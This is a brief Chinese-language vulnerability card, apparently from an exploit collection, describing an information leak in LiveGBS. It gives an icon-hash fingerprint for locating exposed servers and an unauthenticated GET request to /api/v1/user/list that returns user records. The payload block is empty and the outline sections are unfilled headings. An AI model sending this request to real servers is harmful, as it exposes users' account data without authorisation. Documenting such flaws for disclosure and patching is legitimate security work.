# LiveGBSlist存在信息泄漏漏洞

- **系统**：LiveGBSlist　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`icon_hash="-206100324"`
- **请求**：`GET /api/v1/user/list?q=&start=0&limit=100&enable=&sort=CreatedAt&order=desc HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```

```

**其他**
- LiveGBS list存在信息泄漏漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * LiveGBS